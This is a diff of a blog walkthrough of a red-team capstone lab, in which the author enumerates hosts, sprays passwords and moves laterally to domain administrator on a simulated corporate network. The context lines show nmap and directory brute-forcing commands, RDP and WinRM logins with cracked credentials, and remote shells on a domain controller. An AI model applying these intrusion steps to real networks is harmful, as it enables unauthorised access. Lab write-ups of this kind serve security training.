@@ -1,5 +1,5 @@
 ---
-title: Breaking the Vault | A Detailed Walkthrough of the RedTeam Capstone Challenge
+title: Breaking the Vault | A Detailed Walkthrough of The RedTeam Capstone Challenge
 author: Muhammad Adel
 date: 2024-07-26 18:52:00 +0200
 categories: [RedTeaming]
@@ -103,7 +103,7 @@ Please make sure you understand the points below before starting. If any point i
 
 ### **Capstone Challenge Resources**
 
-Downloading the Capstone Challenge resources, we receive two files detailing the current password policies and a base list of passwords. Additionally, we get a list of common tools to use throughout the challenge.
+Let's start our journey by Downloading the Capstone Challenge resources, we receive two files detailing the current password policies and a base list of passwords. Additionally, we get a list of common tools to use throughout the challenge.
 
 ### **Updating the hosts file**
 
@@ -166,7 +166,13 @@ PORT   STATE SERVICE
 ```
 
 #### **The Web Page**
-This IP is hosting a web page that gives us an overview about the company and its team. As this simulates real red team engagements, knowing company workers is a critical part of any redteam engagements.
+This IP is hosting a web page that gives us an overview about the company and its team.
+
+![Untitled](/assets/N-RedTeamCC/webpage1.png)
+
+As this simulates real red team engagements, knowing company workers is a critical part of any redteam engagements.
+![Untitled](/assets/N-RedTeamCC/webpage2.png)
+
 ```bash
 Aimee Walker -- Lead Developers
 Patrick Edwards -- Lead Developers
@@ -190,6 +196,7 @@ Also, looking at the image name gave us hints about the email creation rules tha
 ![Untitled](/assets/N-RedTeamCC/Untitled.png)
 
 #### **Directory Brute forcing**
+Let's discover some directories:
 ```bash
 ┌──(root㉿kali)-[/opt/dirsearch]
 └─$ python3 dirsearch.py -u 10.200.x.13 -e php --random-agent
@@ -278,6 +285,7 @@ Hmm! But what could be the username and the password for this? Let’s resume ou
 
 ### **VPN Machine**
 #### **Nmap**
+Running Nmap tool to check for open ports:
 ```bash
 # Nmap 7.93 scan initiated Sat May 13 14:29:54 2023 as: nmap -p- --min-rate 5000 -oN
 scans/nmap_alltcp.md 10.200.103.12
@@ -292,10 +300,11 @@ PORT STATE SERVICE
 ```
 
 #### **The Web Page**
-a normal login page, but if we got any creds we will get access to the Internal Network.
+A normal login page, but if we got any creds we will get access to the Internal Network.
 ![Untitled](/assets/N-RedTeamCC/Untitled%205.png)
 
 #### **Directory Brute forcing**
+Looking for any hidden directories:
 ```bash
 ┌──(root㉿kali)-[/opt/dirsearch]
 └─$ python3 dirsearch.py -u http://10.200.x.12/ --random-agent
@@ -362,6 +371,7 @@ Who are those **10.200.x.21/22** ?? Let’s put them aside for now and resume ou
 
 ### **Mail Machine**
 #### **Nmap**
+Doing Nmap, to check if there are any vulnerable services:
 ```bash
 # Nmap 7.93 scan initiated Sat May 13 12:22:57 2023 as: nmap -p- --min-rate 5000 -oN
 scans/nmap_alltcp 10.200.103.11
@@ -471,9 +481,11 @@ PORT      STATE  SERVICE       VERSION
 ```
 
 #### **The Web Page**
+Hmmm, Port 80 seems empty:
 ![Untitled](/assets/N-RedTeamCC/Untitled%206.png)
 
 #### **Directory Brute forcing**
+It seems nothing there!
 ```bash
 ──(root㉿kali)-[~]
 └─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.200.x.11//october/index.php/FUZZ
@@ -500,7 +512,6 @@ ________________________________________________
 
 :: Progress: [220560/220560] :: Job [1/1] :: 315 req/sec :: Duration: [0:12:54] :: Errors: 0 ::
 ```
-It seems nothing there!
 
 #### **Accessing Our MailBox**
 As the SSH Server instructions suggest, it gave us creds for an email, so let’s download any mail service like **thunderbird** to get access to our inbox.
@@ -654,7 +665,7 @@ Hmm! Since there are no emails in their inbox, let’s try to spray those valid 
 ```
 
 ## **Foothold on The Corporate Division Tier 2 Infrastructure**
-let’s access them and see what is inside.
+let’s access them and see what is inside:
 ```bash
 $ xfreerdp /u:mohammad.ahmed /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.21 /drive:share,/opt/
 ```
@@ -662,6 +673,7 @@ $ xfreerdp /u:mohammad.ahmed /p:'Password1!' +clipboard /dynamic-resolution /cer
 ![Untitled](/assets/N-RedTeamCC/Untitled%2011.png)
 
 **Submitting Flags**
+Great as we now have access in the internal network let's sumbit our first flags:
 ```bash
 ┌──(root㉿kali)-[~]
 └─$ ssh e-citizen@10.200.x.250
@@ -843,7 +855,7 @@ Host script results:
 |_    Message signing enabled but not required
 ```
 **Manual Enumeration**
-
+Doing some manual enumeration have a better view about our pwned machines and users:
 ```powershell
 PS C:\Users\mohammad.ahmed> hostname
 WRK1
@@ -1070,6 +1082,8 @@ C:\Windows\system32>hostname
 hostname
 WRK1
 ```
+Great!! we are now having local admin privliges on the WRK1 machine.
+
 ### **Persistence**
 let’s do persistence and create our own privileged username.
 
@@ -1092,7 +1106,7 @@ We are now able to obtain the following flag:
 
 **From WRK1 Machine**
 
-We have achieved local administrator access on the machine. However, to fully compromise the Active Directory, we need to obtain a Domain Administrator account. I have dived deep into enumeration, and I couldn’t find something interesting except this service account.
+We have achieved local administrator access on the WRK1 machine. However, to fully compromise the Active Directory, we need to obtain a Domain Admin account. I have dived deep into enumeration, and I couldn’t find something interesting except this service account.
 ```powershell
 PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity svcOctober
 
@@ -1305,6 +1319,7 @@ GREAAAT! It seems that the svcScanning user is a member of the `services@corp.th
 **From SERVER2 Machine**
 
 **PowerShell Remote**
+As per bloodhound output, let's take advanage of our svcScanning user to execute remote commands on the Server2 machine:
 ```powershell
 PS C:\Users\mohammad.ahmed> $Secpass = ConvertTo-SecureString 'Password1!' -AsPlainText -Force
 PS C:\Users\mohammad.ahmed> $Cred = New-Object System.Management.Automation.PSCredential('corp.thereserve.loc\svcScanning', $Secpass)
@@ -1570,11 +1585,6 @@ PS C:\Users\svcScanning\Desktop> winrs -r:rootdc.thereserve.loc cmd.exe
 Microsoft Windows [Version 10.0.17763.3287]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
-C:\Users\Administrator.CORP>whomai
-whomai
-'whomai' is not recognized as an internal or external command,
-operable program or batch file.
-
 C:\Users\Administrator.CORP>whoami
 whoami
 corp\administrator
@@ -1583,7 +1593,7 @@ C:\Users\Administrator.CORP>hostname
 hostname
 ROOTDC
 ```
-We are now able to obtain the following flags:
+Great, now we have administrative access on the RootDC machine "the parent domain". We are now able to obtain the following flags:
 - ***Flag 15, Foothold on Parent Domain***
 
 - ***Flag 16, Administrative access to Parent Domain***
